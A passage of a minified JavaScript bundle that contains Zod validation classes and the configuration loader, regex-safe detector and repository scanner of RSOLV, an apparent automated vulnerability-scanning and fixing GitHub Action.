Set(this._def.values);if(!this._cache.has(X.data)){let Q=this._getOrReturnCtx(X),J=this._def.values;return I1(Q,{received:Q.data,code:B1.invalid_enum_value,options:J}),n1}return O9(X.data)}get options(){return this._def.values}get enum(){let X={};for(let Q of this._def.values)X[Q]=Q;return X}get Values(){let X={};for(let Q of this._def.values)X[Q]=Q;return X}get Enum(){let X={};for(let Q of this._def.values)X[Q]=Q;return X}extract(X,Q=this._def){return WX.create(X,{...this._def,...Q})}exclude(X,Q=this._def){return WX.create(this.options.filter((J)=>!X.includes(J)),{...this._def,...Q})}}WX.create=T2;class g7 extends U0{_parse(X){let Q=Z0.getValidEnumValues(this._def.values),J=this._getOrReturnCtx(X);if(J.parsedType!==F1.string&&J.parsedType!==F1.number){let Y=Z0.objectValues(Q);return I1(J,{expected:Z0.joinValues(Y),received:J.parsedType,code:B1.invalid_type}),n1}if(!this._cache)this._cache=new Set(Z0.getValidEnumValues(this._def.values));if(!this._cache.has(X.data)){let Y=Z0.objectValues(Q);return I1(J,{received:J.data,code:B1.invalid_enum_value,options:Y}),n1}return O9(X.data)}get enum(){return this._def.values}}g7.create=(X,Q)=>{return new g7({values:X,typeName:e1.ZodNativeEnum,...G0(Q)})};class uX extends U0{unwrap(){return this._def.type}_parse(X){let{ctx:Q}=this._processInputParams(X);if(Q.parsedType!==F1.promise&&Q.common.async===!1)return I1(Q,{code:B1.invalid_type,expected:F1.promise,received:Q.parsedType}),n1;let J=Q.parsedType===F1.promise?Q.data:Promise.resolve(Q.data);return O9(J.then((Y)=>{return this._def.type.parseAsync(Y,{path:Q.path,errorMap:Q.common.contextualErrorMap})}))}}uX.create=(X,Q)=>{return new uX({type:X,typeName:e1.ZodPromise,...G0(Q)})};class w6 extends U0{innerType(){return this._def.schema}sourceType(){return this._def.schema._def.typeName===e1.ZodEffects?this._def.schema.sourceType():this._def.schema}_parse(X){let{status:Q,ctx:J}=this._processInputParams(X),Y=this._def.effect||null,W={addIssue:(G)=>{if(I1(J,G),G.fatal)Q.abort();else Q.dirty()},get path(){return J.path}};if(W.addIssue=W.addIssue.bind(W),Y.type==="preprocess"){let G=Y.transform(J.data,W);if(J.common.async)return Promise.resolve(G).then(async(H)=>{if(Q.value==="aborted")return n1;let $=await this._def.schema._parseAsync({data:H,path:J.path,parent:J});if($.status==="aborted")return n1;if($.status==="dirty")return hX($.value);if(Q.value==="dirty")return hX($.value);return $});else{if(Q.value==="aborted")return n1;let H=this._def.schema._parseSync({data:G,path:J.path,parent:J});if(H.status==="aborted")return n1;if(H.status==="dirty")return hX(H.value);if(Q.value==="dirty")return hX(H.value);return H}}if(Y.type==="refinement"){let G=(H)=>{let $=Y.refinement(H,W);if(J.common.async)return Promise.resolve($);if($ instanceof Promise)throw Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");return H};if(J.common.async===!1){let H=this._def.schema._parseSync({data:J.data,path:J.path,parent:J});if(H.status==="aborted")return n1;if(H.status==="dirty")Q.dirty();return G(H.value),{status:Q.value,value:H.value}}else return this._def.schema._parseAsync({data:J.data,path:J.path,parent:J}).then((H)=>{if(H.status==="aborted")return n1;if(H.status==="dirty")Q.dirty();return G(H.value).then(()=>{return{status:Q.value,value:H.value}})})}if(Y.type==="transform")if(J.common.async===!1){let G=this._def.schema._parseSync({data:J.data,path:J.path,parent:J});if(!XX(G))return n1;let H=Y.transform(G.value,W);if(H instanceof Promise)throw Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");return{status:Q.value,value:H}}else return this._def.schema._parseAsync({data:J.data,path:J.path,parent:J}).then((G)=>{if(!XX(G))return n1;return Promise.resolve(Y.transform(G.value,W)).then((H)=>({status:Q.value,value:H}))});Z0.assertNever(Y)}}w6.create=(X,Q,J)=>{return new w6({schema:X,typeName:e1.ZodEffects,effect:Q,...G0(J)})};w6.createWithPreprocess=(X,Q,J)=>{return new w6({schema:Q,effect:{type:"preprocess",transform:X},typeName:e1.ZodEffects,...G0(J)})};class D6 extends U0{_parse(X){if(this._getType(X)===F1.undefined)return O9(void 0);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}}D6.create=(X,Q)=>{return new D6({innerType:X,typeName:e1.ZodOptional,...G0(Q)})};class O8 extends U0{_parse(X){if(this._getType(X)===F1.null)return O9(null);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}}O8.create=(X,Q)=>{return new O8({innerType:X,typeName:e1.ZodNullable,...G0(Q)})};class m7 extends U0{_parse(X){let{ctx:Q}=this._processInputParams(X),J=Q.data;if(Q.parsedType===F1.undefined)J=this._def.defaultValue();return this._def.innerType._parse({data:J,path:Q.path,parent:Q})}removeDefault(){return this._def.innerType}}m7.create=(X,Q)=>{return new m7({innerType:X,typeName:e1.ZodDefault,defaultValue:typeof Q.default==="function"?Q.default:()=>Q.default,...G0(Q)})};class u7 extends U0{_parse(X){let{ctx:Q}=this._processInputParams(X),J={...Q,common:{...Q.common,issues:[]}},Y=this._def.innerType._parse({data:J.data,path:J.path,parent:{...J}});if(E7(Y))return Y.then((W)=>{return{status:"valid",value:W.status==="valid"?W.value:this._def.catchValue({get error(){return new y9(J.common.issues)},input:J.data})}});else return{status:"valid",value:Y.status==="valid"?Y.value:this._def.catchValue({get error(){return new y9(J.common.issues)},input:J.data})}}removeCatch(){return this._def.innerType}}u7.create=(X,Q)=>{return new u7({innerType:X,typeName:e1.ZodCatch,catchValue:typeof Q.catch==="function"?Q.catch:()=>Q.catch,...G0(Q)})};class M4 extends U0{_parse(X){if(this._getType(X)!==F1.nan){let J=this._getOrReturnCtx(X);return I1(J,{code:B1.invalid_type,expected:F1.nan,received:J.parsedType}),n1}return{status:"valid",value:X.data}}}M4.create=(X)=>{return new M4({typeName:e1.ZodNaN,...G0(X)})};var R_=Symbol("zod_brand");class PJ extends U0{_parse(X){let{ctx:Q}=this._processInputParams(X),J=Q.data;return this._def.type._parse({data:J,path:Q.path,parent:Q})}unwrap(){return this._def.type}}class j4 extends U0{_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.common.async)return(async()=>{let W=await this._def.in._parseAsync({data:J.data,path:J.path,parent:J});if(W.status==="aborted")return n1;if(W.status==="dirty")return Q.dirty(),hX(W.value);else return this._def.out._parseAsync({data:W.value,path:J.path,parent:J})})();else{let Y=this._def.in._parseSync({data:J.data,path:J.path,parent:J});if(Y.status==="aborted")return n1;if(Y.status==="dirty")return Q.dirty(),{status:"dirty",value:Y.value};else return this._def.out._parseSync({data:Y.value,path:J.path,parent:J})}}static create(X,Q){return new j4({in:X,out:Q,typeName:e1.ZodPipeline})}}class c7 extends U0{_parse(X){let Q=this._def.innerType._parse(X),J=(Y)=>{if(XX(Y))Y.value=Object.freeze(Y.value);return Y};return E7(Q)?Q.then((Y)=>J(Y)):J(Q)}unwrap(){return this._def.innerType}}c7.create=(X,Q)=>{return new c7({innerType:X,typeName:e1.ZodReadonly,...G0(Q)})};function C2(X,Q){let J=typeof X==="function"?X(Q):typeof X==="string"?{message:X}:X;return typeof J==="string"?{message:J}:J}function _2(X,Q={},J){if(X)return gX.create().superRefine((Y,W)=>{let G=X(Y);if(G instanceof Promise)return G.then((H)=>{if(!H){let $=C2(Q,Y),z=$.fatal??J??!0;W.addIssue({code:"custom",...$,fatal:z})}});if(!G){let H=C2(Q,Y),$=H.fatal??J??!0;W.addIssue({code:"custom",...H,fatal:$})}return});return gX.create()}var L_={object:c0.lazycreate},e1;(function(X){X.ZodString="ZodString",X.ZodNumber="ZodNumber",X.ZodNaN="ZodNaN",X.ZodBigInt="ZodBigInt",X.ZodBoolean="ZodBoolean",X.ZodDate="ZodDate",X.ZodSymbol="ZodSymbol",X.ZodUndefined="ZodUndefined",X.ZodNull="ZodNull",X.ZodAny="ZodAny",X.ZodUnknown="ZodUnknown",X.ZodNever="ZodNever",X.ZodVoid="ZodVoid",X.ZodArray="ZodArray",X.ZodObject="ZodObject",X.ZodUnion="ZodUnion",X.ZodDiscriminatedUnion="ZodDiscriminatedUnion",X.ZodIntersection="ZodIntersection",X.ZodTuple="ZodTuple",X.ZodRecord="ZodRecord",X.ZodMap="ZodMap",X.ZodSet="ZodSet",X.ZodFunction="ZodFunction",X.ZodLazy="ZodLazy",X.ZodLiteral="ZodLiteral",X.ZodEnum="ZodEnum",X.ZodEffects="ZodEffects",X.ZodNativeEnum="ZodNativeEnum",X.ZodOptional="ZodOptional",X.ZodNullable="ZodNullable",X.ZodDefault="ZodDefault",X.ZodCatch="ZodCatch",X.ZodPromise="ZodPromise",X.ZodBranded="ZodBranded",X.ZodPipeline="ZodPipeline",X.ZodReadonly="ZodReadonly"})(e1||(e1={}));var D_=(X,Q={message:`Input not instance of ${X.name}`})=>_2((J)=>J instanceof X,Q),k2=R6.create,b2=JX.create,N_=M4.create,w_=YX.create,v2=k7.create,I_=yX.create,C_=V4.create,P_=b7.create,S_=v7.create,E_=gX.create,T_=QX.create,__=d6.create,k_=B4.create,b_=L6.create,v_=c0.create,x_=c0.strictCreate,f_=x7.create,h_=CJ.create,y_=f7.create,g_=i6.create,m_=q4.create,u_=Z4.create,c_=mX.create,l_=_7.create,p_=h7.create,d_=y7.create,i_=WX.create,r_=g7.create,n_=uX.create,a_=w6.create,o_=D6.create,s_=O8.create,t_=w6.createWithPreprocess,e_=j4.create,Xk=()=>k2().optional(),Qk=()=>b2().optional(),Jk=()=>v2().optional(),Yk={string:(X)=>R6.create({...X,coerce:!0}),number:(X)=>JX.create({...X,coerce:!0}),boolean:(X)=>k7.create({...X,coerce:!0}),bigint:(X)=>YX.create({...X,coerce:!0}),date:(X)=>yX.create({...X,coerce:!0})};var Wk=n1;y1();var yG={CLAUDE_OPUS:"claude-opus-4-6",CLAUDE_SONNET:"claude-sonnet-4-5-20250929",CLAUDE_HAIKU:"claude-haiku-4-5-20251001"},a10={CLAUDE_OPUS:`anthropic/${yG.CLAUDE_OPUS}`,CLAUDE_SONNET:`anthropic/${yG.CLAUDE_SONNET}`},gG=yG.CLAUDE_SONNET;var Gk=E1.object({provider:E1.string(),providerApiKey:E1.string().optional(),model:E1.string(),baseUrl:E1.string().optional(),maxTokens:E1.number().optional(),temperature:E1.number().optional(),contextLimit:E1.number().optional(),timeout:E1.number().optional(),useVendedCredentials:E1.boolean().optional()}),Hk=E1.object({enabled:E1.boolean(),image:E1.string().optional(),memoryLimit:E1.string().optional(),cpuLimit:E1.string().optional(),timeout:E1.number().optional(),securityProfile:E1.enum(["default","strict","relaxed"]).optional(),environmentVariables:E1.record(E1.string(),E1.string()).optional()}),$k=E1.object({disableNetworkAccess:E1.boolean().optional(),allowedDomains:E1.array(E1.string()).optional(),scanDependencies:E1.boolean().optional(),preventSecretLeakage:E1.boolean().optional(),maxFileSize:E1.number().optional(),timeoutSeconds:E1.number().optional(),requireCodeReview:E1.boolean().optional()}),zk=E1.object({enabled:E1.boolean().optional(),generateForVulnerabilities:E1.boolean().optional(),includeInPR:E1.boolean().optional(),validateFixes:E1.boolean().optional(),languages:E1.array(E1.string()).optional(),frameworks:E1.record(E1.string(),E1.array(E1.string())).optional()}),Uk=E1.object({enabled:E1.boolean().optional(),maxIterations:E1.number().optional(),maxIterationsByType:E1.record(E1.string(),E1.number()).optional(),maxIterationsByTier:E1.record(E1.string(),E1.number()).optional()}),Kk=E1.object({rsolvApiKey:E1.string(),configPath:E1.string(),issueLabel:E1.string(),scanLabel:E1.string().optional(),enableSecurityAnalysis:E1.boolean().optional(),environmentVariables:E1.record(E1.string(),E1.string()).optional(),repoToken:E1.string().optional(),aiProvider:Gk,containerConfig:Hk,securitySettings:$k,maxIssues:E1.number().min(1).optional(),useGitBasedEditing:E1.boolean().optional(),useStructuredPhases:E1.boolean().optional(),testGeneration:zk.optional(),fixValidation:Uk.optional(),executableTests:E1.boolean().optional(),claudeMaxTurns:E1.number().min(1).max(20).optional(),createPR:E1.boolean().optional()});async function f2(){try{V.info("Loading configuration");let X=Vk(),Q=process.env.RSOLV_CONFIG_PATH||".github/rsolv.yml",J=await Bk(Q),Y=qk(),W={...X,...J,...Y,aiProvider:{...X.aiProvider,...J.aiProvider,...Y.aiProvider},containerConfig:{...X.containerConfig,...J.containerConfig,...Y.containerConfig},securitySettings:{...X.securitySettings,...J.securitySettings,...Y.securitySettings}},G=Zk(W);if(G.aiProvider.useVendedCredentials&&G.rsolvApiKey)process.env.RSOLV_API_KEY=G.rsolvApiKey,V.info("Set RSOLV_API_KEY environment variable for vended credentials (config loader)");return V.debug("Configuration loaded successfully"),V.info(`Final config - rsolvApiKey: ${G.rsolvApiKey?"present":"not set"}`),G}catch(X){throw V.error("Failed to load configuration",X),Error(`Configuration error: ${X instanceof Error?X.message:String(X)}`)}}function Vk(){return{configPath:".github/rsolv.yml",issueLabel:"rsolv:automate",scanLabel:"rsolv:detected",enableSecurityAnalysis:!0,maxIssues:void 0,useGitBasedEditing:!0,useStructuredPhases:!0,aiProvider:{provider:"claude-code",model:gG,temperature:0.2,contextLimit:1e5,timeout:3600000,useVendedCredentials:!0},containerConfig:{enabled:!0,image:"rsolv/code-analysis:latest",memoryLimit:"2g",cpuLimit:"1",timeout:300,securityProfile:"default"},securitySettings:{disableNetworkAccess:!0,scanDependencies:!0,preventSecretLeakage:!0,maxFileSize:1048576,timeoutSeconds:300,requireCodeReview:!0},testGeneration:{enabled:process.env.ENABLE_TEST_GENERATION==="true",generateForVulnerabilities:!0,includeInPR:!0,validateFixes:process.env.ENABLE_FIX_VALIDATION==="true",languages:process.env.TEST_GEN_LANGUAGES?.split(",")||["javascript","typescript"],frameworks:{javascript:["jest","mocha","vitest"],typescript:["jest","mocha","vitest"],python:["pytest","unittest"],ruby:["rspec","minitest"],php:["phpunit","pest"],java:["junit5","testng"]}},fixValidation:{enabled:(()=>{let X=process.env.DISABLE_FIX_VALIDATION,Q=X==="true";return console.log(`[CONFIG DEBUG] DISABLE_FIX_VALIDATION env: "${X}"`),console.log(`[CONFIG DEBUG] Setting fixValidation.enabled to: ${!Q}`),!Q})(),maxIterations:3,maxIterationsByType:{},maxIterationsByTier:{}},executableTests:process.env.RSOLV_EXECUTABLE_TESTS!=="false",claudeMaxTurns:5,createPR:!0}}async function Bk(X){try{if(!SJ.existsSync(X))return V.info(`Configuration file not found at ${X}, using defaults`),{};V.info(`Loading configuration from ${X}`);let Q=SJ.readFileSync(X,"utf8"),J=N2(Q);return V.debug("Configuration file loaded successfully"),J||{}}catch(Q){return V.error(`Error loading configuration from file ${X}`,Q),{}}}function qk(){V.info("Loading configuration from environment variables");let X=process.env.RSOLV_API_KEY||process.env.INPUT_API_KEY||process.env.INPUT_RSOLVAPI_KEY||process.env.INPUT_RSOLVAPIKEY;V.info(`Environment RSOLV_API_KEY: ${X?"present":"not set"}`);let Q={rsolvApiKey:X,configPath:process.env.RSOLV_CONFIG_PATH||process.env.INPUT_CONFIG_PATH,issueLabel:process.env.RSOLV_ISSUE_LABEL||process.env.INPUT_ISSUE_LABEL,repoToken:process.env.GITHUB_TOKEN};if(process.env.RSOLV_MAX_ISSUES){let Y=parseInt(process.env.RSOLV_MAX_ISSUES,10);if(!isNaN(Y))Q.maxIssues=Y}if(process.env.RSOLV_USE_GIT_BASED_EDITING!==void 0)Q.useGitBasedEditing=process.env.RSOLV_USE_GIT_BASED_EDITING==="true";else Q.useGitBasedEditing=!0;if(process.env.RSOLV_USE_STRUCTURED_PHASES!==void 0)Q.useStructuredPhases=process.env.RSOLV_USE_STRUCTURED_PHASES==="true";else Q.useStructuredPhases=!0;if(process.env.RSOLV_EXECUTABLE_TESTS!==void 0)Q.executableTests=process.env.RSOLV_EXECUTABLE_TESTS==="true";if(process.env.RSOLV_CLAUDE_MAX_TURNS){let Y=parseInt(process.env.RSOLV_CLAUDE_MAX_TURNS,10);if(!isNaN(Y)&&Y>=1&&Y<=20)Q.claudeMaxTurns=Y;else V.warn(`Invalid RSOLV_CLAUDE_MAX_TURNS value: ${process.env.RSOLV_CLAUDE_MAX_TURNS}. Must be between 1 and 20. Using default: 5`)}if(process.env.RSOLV_CREATE_PR!==void 0)Q.createPR=process.env.RSOLV_CREATE_PR==="true";if(process.env.RSOLV_ENVIRONMENT_VARIABLES)try{Q.environmentVariables=JSON.parse(process.env.RSOLV_ENVIRONMENT_VARIABLES)}catch(Y){V.error("Error parsing RSOLV_ENVIRONMENT_VARIABLES",Y)}if(process.env.RSOLV_AI_PROVIDER||process.env.RSOLV_AI_MODEL||process.env.RSOLV_AI_API_KEY||process.env.RSOLV_AI_BASE_URL||process.env.RSOLV_AI_TEMPERATURE||process.env.RSOLV_AI_MAX_TOKENS){let Y=process.env.RSOLV_AI_API_KEY;if(Q.aiProvider={provider:process.env.RSOLV_AI_PROVIDER||"claude-code",providerApiKey:Y,model:process.env.RSOLV_AI_MODEL||gG,baseUrl:process.env.RSOLV_AI_BASE_URL,useVendedCredentials:process.env.RSOLV_USE_VENDED_CREDENTIALS!==void 0?process.env.RSOLV_USE_VENDED_CREDENTIALS==="true":!0},process.env.RSOLV_AI_MODEL)V.info(`AI model from environment: ${process.env.RSOLV_AI_MODEL}`);if(process.env.RSOLV_AI_TEMPERATURE)Q.aiProvider.temperature=parseFloat(process.env.RSOLV_AI_TEMPERATURE);if(process.env.RSOLV_AI_MAX_TOKENS)Q.aiProvider.maxTokens=parseInt(process.env.RSOLV_AI_MAX_TOKENS,10)}if(process.env.RSOLV_CONTAINER_ENABLED!==void 0){if(Q.containerConfig={enabled:process.env.RSOLV_CONTAINER_ENABLED==="true",image:process.env.RSOLV_CONTAINER_IMAGE,memoryLimit:process.env.RSOLV_CONTAINER_MEMORY_LIMIT,cpuLimit:process.env.RSOLV_CONTAINER_CPU_LIMIT},process.env.RSOLV_CONTAINER_TIMEOUT)Q.containerConfig.timeout=parseInt(process.env.RSOLV_CONTAINER_TIMEOUT,10)}return Object.keys(Q).forEach((Y)=>{if(Q[Y]===void 0)delete Q[Y]}),Q}function Zk(X){V.debug("Validating configuration");try{if(!X.rsolvApiKey)throw Error("RSOLV API key is required (rsolvApiKey)");let Q=Kk.parse(X);return V.debug("Configuration validation successful"),Q}catch(Q){if(Q instanceof E1.ZodError){let J=Q.errors.map((Y)=>`${Y.path.join(".")}: ${Y.message}`).join(", ");throw V.error(`Configuration validation failed: ${J}`),Error(`Invalid configuration: ${J}`)}throw Q}}y1();g9();var Vb=["scan","validate","mitigate","full","validate-only","validate-and-fix","fix-only","billing"];function Bb(){let X=process.argv.slice(2);for(let Q=0;Q<X.length;Q++){let J=X[Q];if(J.startsWith("--mode="))return J.substring(7);if(J==="--mode"&&Q+1<X.length)return X[Q+1]}return}function SB(){let X=Bb();if(X){let Y=X.toLowerCase();if(PB(Y))return Y}let Q=process.env.RSOLV_MODE||process.env.INPUT_MODE;if(Q){let Y=Q.toLowerCase();if(PB(Y))return Y}let J=process.env.RSOLV_SCAN_MODE;if(J&&J.toLowerCase()==="scan")return"scan";return"full"}function PB(X){return Vb.includes(X)}function EB(X){switch(X){case"scan":return"Scan for vulnerabilities and create issues";case"validate":case"validate-only":return"Validate vulnerabilities with failing tests";case"mitigate":case"fix-only":return"Fix validated vulnerabilities";case"validate-and-fix":return"Validate and fix vulnerabilities for specific issues";case"full":return"Run all phases: scan, validate, and mitigate";case"billing":return"Trigger billing for merged PR (RFC-091)";default:return"Unknown mode"}}y1();s7();var TD=C0(Yq(),1);import{Worker as am1}from"worker_threads";import*as oY from"path";import{fileURLToPath as om1}from"url";var sm1=om1(import.meta.url),tm1=oY.dirname(sm1);class MU{patternSource;skippedPatterns=new Set;lastError=null;activeWorkers=new Set;terminatedWorkers=new Set;defaultTimeout=30000;constructor(X){this.patternSource=X||L8()}async detect(X,Q,J){if(!X||typeof X!=="string")return this.lastError=Error("Invalid code input"),V.error("SafeDetector: Invalid code input"),[];try{let Y=await this.patternSource.getPatternsByLanguage(Q);return V.info(`SafeDetector: Analyzing ${Q} code with ${Y.length} patterns`),V.info(`SafeDetector: Running all ${Y.length} patterns in worker thread for safety`),await this.runPatternsInWorker(X,Q,Y,J,this.defaultTimeout)}catch(Y){return this.lastError=Y,V.error("SafeDetector error:",Y),[]}}async detectWithPattern(X,Q,J,Y){let W=[J],{safe:G,unsafe:H}=this.filterPatterns(W);if(H.length>0)return this.runPatternsInWorker(X,Q,H,"test.file",Y||this.defaultTimeout);else if(G.length>0)return this.runPatternsInMainThread(X,Q,G,"test.file");return[]}filterPatterns(X){let Q=[],J=[];for(let Y of X){let W=!0;if(Y.patterns?.regex){for(let G of Y.patterns.regex)if(!TD.default(G,{limit:25})){W=!1,this.skippedPatterns.add(Y.id),V.warn(`SafeDetector: Pattern ${Y.id} marked as potentially unsafe`);break}}if(W)Q.push(Y);else J.push(Y)}return{safe:Q,unsafe:J}}async runPatternsInMainThread(X,Q,J,Y){let{SecurityDetectorV2:W}=await Promise.resolve().then(() => (BQ(),ED)),G=new W,H={getPatternsByLanguage:async()=>J};return G.patternSource=H,G.detect(X,Q,Y||"unknown")}async runPatternsInWorker(X,Q,J,Y,W=30000){if(J.length===0)return[];return new Promise((G)=>{let H=oY.join(tm1,"detector-worker.js"),$=new am1(H,{workerData:{code:X,language:Q,patterns:J,filePath:Y||"unknown"}});this.activeWorkers.add($);let z=!1,U=(B)=>{if(z)return;z=!0,clearTimeout(K),this.activeWorkers.delete($),this.terminatedWorkers.add($),$.terminate(),G(B)},K=setTimeout(()=>{V.warn(`SafeDetector: Worker timeout after ${W}ms for ${Y||"unknown"}`),U([])},W);$.on("message",(B)=>{if(B.type==="result")U(B.data||[]);else V.error(`SafeDetector: Worker error: ${B.error}`),this.lastError=Error(B.error),U([])}),$.on("error",(B)=>{V.error("SafeDetector: Worker error:",B),this.lastError=B,U([])}),$.on("exit",(B)=>{if(B!==0&&!this.terminatedWorkers.has($))V.error(`SafeDetector: Worker exited with code ${B}`);this.terminatedWorkers.delete($)})})}getSkippedPatterns(){return Array.from(this.skippedPatterns)}getLastError(){return this.lastError}getWorkerCount(){return this.activeWorkers.size}getTerminatedWorkerCount(){return this.terminatedWorkers.size}cleanup(){for(let X of this.activeWorkers)X.terminate();this.activeWorkers.clear()}}g9();y1();s7();y1();class jU{apiClient;cache=new Map;constructor(X){this.apiClient=new _8({apiKey:X,baseUrl:process.env.RSOLV_API_URL||"https://api.rsolv.dev"})}async validateVulnerabilities(X,Q){if(X.length===0)return[];V.info(`Validating ${X.length} vulnerabilities with AST analysis`);let J=50,Y=[];for(let G=0;G<X.length;G+=J)Y.push(X.slice(G,G+J));V.info(`Batching ${X.length} vulnerabilities into ${Y.length} batches of up to ${J}`);let W=[];for(let G=0;G<Y.length;G++){let H=Y[G];V.info(`Validating batch ${G+1}/${Y.length} (${H.length} vulnerabilities)`);try{let $=this.getRelevantFileContents(H,Q),z=this.prepareValidationRequest(H,$),U=await this.callValidationAPI(z),K=this.processValidationResponse(H,U);W.push(...K),V.info(`Batch ${G+1}/${Y.length} validated: ${K.length}/${H.length} confirmed`)}catch($){V.warn(`Batch ${G+1}/${Y.length} validation failed, including all ${H.length} vulnerabilities`,{error:$ instanceof Error?$.message:$}),W.push(...H)}}return V.info(`AST validation complete: ${W.length}/${X.length} vulnerabilities validated`),W}getRelevantFileContents(X,Q){let J=new Set;for(let W of X)if(W.filePath)J.add(W.filePath);let Y=new Map;for(let W of J){let G=Q.get(W);if(G!==void 0)Y.set(W,G)}return Y}prepareValidationRequest(X,Q){let J=X.map((W)=>({id:`${W.type}-${W.line}-${W.column||0}`,type:W.type,patternId:W.type,file:W.filePath||"",line:W.line,code:W.snippet||"",severity:W.severity})),Y={};for(let[W,G]of Q)Y[W]={content:G};return{vulnerabilities:J,files:Y}}async callValidationAPI(X){let Q=await this.apiClient.validateVulnerabilities(X);if(process.env.DEBUG_AST_VALIDATION)console.log("AST Validation Request:",JSON.stringify(X,null,2)),console.log("AST Validation Response:",JSON.stringify(Q,null,2));return Q}processValidationResponse(X,Q){let J=new Map(Q.validated.map((W)=>[W.id,W])),Y=X.filter((W)=>{let G=`${W.type}-${W.line}-${W.column||0}`,H=J.get(G);if(!H)return!0;if(!H.isValid)return V.debug(`Filtered false positive: ${W.filePath}:${W.line} - ${H.reason}`),!1;if(H.enclosingFunction)W.enclosingFunction=H.enclosingFunction;return!0});return V.info(`AST validation complete: ${Q.stats.rejected} false positives filtered out`),Y}getCacheKey(X,Q,J){return`${X}:${Q}:${J}`}}qQ();RU();class o9{detector;github;vendorDetector;static NON_PRODUCTION_DIRS=["test/","tests/","__tests__/","__test__/","spec/","specs/","artifacts/","fixtures/","test-fixtures/","__fixtures__/","__mocks__/","mocks/"];static CONFIG_DIRS=["config/",".config/","configs/"];static CONFIG_FILE_PATTERNS=[/\.config\.\w+$/,/\.env\.\w+$/,/^tsconfig.*\.json$/];static MANIFEST_FILES=["Gemfile","Gemfile.lock","config/database.yml",".ruby-version","package.json","prisma/schema.prisma",".node-version","requirements.txt","pyproject.toml","setup.py","setup.cfg","manage.py",".python-version","mix.exs","config/dev.exs","config/test.exs","pom.xml","build.gradle","composer.json",".php-version",".tool-versions"];static NON_PRODUCTION_FILE_PATTERNS=[/\.test\.\w+$/,/\.spec\.\w+$/,/\.tests\.\w+$/,/\.specs\.\w+$/,/_test\.\w+$/,/_spec\.\w+$/,/^Gruntfile\.\w+$/,/^Gulpfile\.\w+$/,/^Rakefile$/,/^Jakefile\.\w+$/];constructor(){this.detector=new MU(L8()),this.github=v0(),this.vendorDetector=new AX}async scan(X){V.info(`Starting vulnerability scan for ${X.repository.owner}/${X.repository.name}`);let Q=Date.now(),J=await this.getRepositoryFiles(X),Y=[];V.info(`Found ${J.length} files to scan`),V.info(`Starting vulnerability detection on ${J.length} files...`);for(let $=0;$<J.length;$++){let z=J[$];if($===0||$===J.length-1||($+1)%10===0)V.info(`Scanning progress: ${$+1}/${J.length} files (${z.path})`);if(z.language&&this.isSupportedLanguage(z.language))try{if(await this.vendorDetector.isVendorFile(z.path,z.content)){V.info(`Skipping vendor/minified file: ${z.path}`);continue}if(o9.isNonProductionFile(z.path)){V.info(`Skipping non-production file: ${z.path}`);continue}let K=await this.detector.detect(z.content,z.language,z.path);if(K.forEach((B)=>{B.filePath=z.path,B.isVendor=!1}),Y.push(...K),K.length>0)V.info(`Found ${K.length} vulnerabilities in ${z.path}`)}catch(U){V.error(`Error scanning file ${z.path}:`,U)}}if(V.info(`Scanning complete. Total vulnerabilities found: ${Y.length}`),o9.applyConfigConfidenceMultiplier(Y),X.enableASTValidation!==!1&&X.rsolvApiKey&&typeof X.rsolvApiKey==="string"&&X.rsolvApiKey.length>0){V.info("Performing AST validation on detected vulnerabilities (enabled by default)...");let $=new jU(X.rsolvApiKey),z=new Map;J.forEach((B)=>z.set(B.path,B.content));let U=Y.length;Y=await $.validateVulnerabilities(Y,z);let K=U-Y.length;V.info(`AST validation complete: ${K} false positives filtered out`)}else if(X.enableASTValidation!==!1)V.warn("AST validation is enabled but skipped - missing RSOLV API key");V.info("Scanned production code only (vendor/minified and non-production files excluded)");let W=await this.captureManifestFiles(X,J),G=this.groupVulnerabilities(Y),H=Date.now()-Q;return V.info(`Scan completed in ${H}ms. Found ${Y.length} vulnerabilities`),this.detector.cleanup(),{repository:`${X.repository.owner}/${X.repository.name}`,branch:X.repository.defaultBranch,scanDate:new Date().toISOString(),totalFiles:J.length,scannedFiles:J.filter(($)=>$.language&&this.isSupportedLanguage($.language)).length,vulnerabilities:Y,groupedVulnerabilities:G,createdIssues:[],manifestFiles:Object.keys(W).length>0?W:void 0}}async getRepositoryFiles(X){let Q=[];try{let{data:J}=await this.github.git.getTree({owner:X.repository.owner,repo:X.repository.name,tree_sha:X.repository.defaultBranch,recursive:"1"}),Y=J.tree.filter((W)=>W.type==="blob"&&W.path&&this.isCodeFile(W.path)&&W.size&&W.size<1e6);V.info(`Fetching content for ${Y.length} code files...`);for(let W=0;W<Y.length;W++){let G=Y[W];if(!G.path||!G.sha)continue;if(W===0||W===Y.length-1||(W+1)%10===0)V.info(`Progress: ${W+1}/${Y.length} files fetched (${G.path})`);try{let{data:H}=await this.github.git.getBlob({owner:X.repository.owner,repo:X.repository.name,file_sha:G.sha}),$=Buffer.from(H.content,"base64").toString("utf-8"),z=this.detectLanguage(G.path);if(z)Q.push({path:G.path,content:$,language:z})}catch(H){V.error(`Error fetching content for ${G.path}:`,H)}}V.info(`Completed fetching ${Q.length} files with supported languages`)}catch(J){throw V.error("Error getting repository files:",J),J}return Q}isCodeFile(X){return[".js",".jsx",".ts",".tsx",".mjs",".cjs",".py",".pyw",".rb",".rake",".java",".php",".phtml",".ex",".exs"].some((J)=>X.endsWith(J))}detectLanguage(X){let Q={".js":"javascript",".jsx":"javascript",".ts":"typescript",".tsx":"typescript",".mjs":"javascript",".cjs":"javascript",".py":"python",".pyw":"python",".rb":"ruby",".rake":"ruby",".java":"java",".php":"php",".phtml":"php",".ex":"elixir",".exs":"elixir"},J=X.substring(X.lastIndexOf("."));return Q[J]||null}static isNonProductionFile(X){let Q=X.replace(/\\/g,"/");for(let Y of o9.NON_PRODUCTION_DIRS)if(Q.includes(`/${Y}`)||Q.startsWith(Y))return!0;let J=Q.split("/").pop()||"";for(let Y of o9.NON_PRODUCTION_FILE_PATTERNS)if(Y.test(J))return!0;return!1}static isConfigFile(X){let Q=X.replace(/\\/g,"/");for(let Y of o9.CONFIG_DIRS)if(Q.startsWith(Y)||Q.includes(`/${Y}`))return!0;let J=Q.split("/").pop()||"";for(let Y of o9.CONFIG_FILE_PATTERNS)if(Y.test(J))return!0;return!1}static applyConfigConfidenceMultiplier(X){for(let Q of X)if(Q.filePath&&o9.isConfigFile(Q.filePath))Q.confidence=Math.round(Q.confidence*0.5);return X}async captureManifestFiles(X,Q){let 